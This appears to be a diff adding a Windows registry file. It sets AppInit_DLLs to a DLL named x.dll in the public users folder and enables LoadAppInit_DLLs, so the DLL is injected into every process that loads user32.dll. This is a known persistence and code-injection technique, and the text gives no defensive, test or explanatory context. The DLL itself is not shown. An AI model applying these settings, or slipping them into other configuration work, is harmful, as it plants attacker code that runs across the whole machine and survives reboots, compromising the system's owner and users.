@@ -1,0 +1,4 @@
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows]
+"AppInit_DLLs"="C:\\Users\\Public\\x.dll"
+"LoadAppInit_DLLs"=dword:00000001
+
